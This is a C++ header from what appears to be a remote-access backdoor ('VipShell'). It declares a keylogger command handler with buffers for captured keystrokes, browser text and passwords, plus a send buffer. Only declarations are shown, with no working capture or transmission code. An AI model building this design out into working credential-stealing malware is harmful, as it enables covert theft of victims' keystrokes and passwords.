#pragma once
#include "defcommandproc.h"

class CGetKeyNoHookProc :
	public CDefCommandProc
{
public:
	CGetKeyNoHookProc(void);
	~CGetKeyNoHookProc(void);
protected:
	virtual void OnCmd_GetDoWork(tagVipShellCmd* info);
	virtual void OnCmd_GetKeyLog(tagVipShellCmd* info);
protected:
	char szIeText[65535];
	char SendText[600];
	char KeyBuffer[65535];     // Key Buffer Array
	char szPassText[65536];
	bool IsWindowsFocusChange();
	HWND PreviousFocus;
};
